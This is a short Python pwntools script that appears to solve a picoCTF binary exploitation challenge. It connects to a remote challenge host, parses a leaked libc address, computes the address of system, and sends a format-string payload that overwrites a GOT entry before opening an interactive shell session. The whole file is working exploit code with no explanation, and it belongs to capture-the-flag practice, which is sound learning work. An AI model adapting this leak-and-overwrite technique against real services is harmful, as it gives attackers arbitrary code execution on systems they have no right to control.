from pwn import *

context.arch = 'amd64'

HOST, PORT = "rhea.picoctf.net", 57951
# HOST, PORT = "127.0.0.1", 31337
r = remote(HOST, PORT)

r.recvuntil(': ')
setvbuf = r.recvline().decode().strip()
libc = int(setvbuf, 16) - 0x7a3f0 # setvbuf offset
system = libc + 0x4f760 # system offset
payload = fmtstr_payload(38, {0x404018: system})
r.sendline(payload)

r.interactive()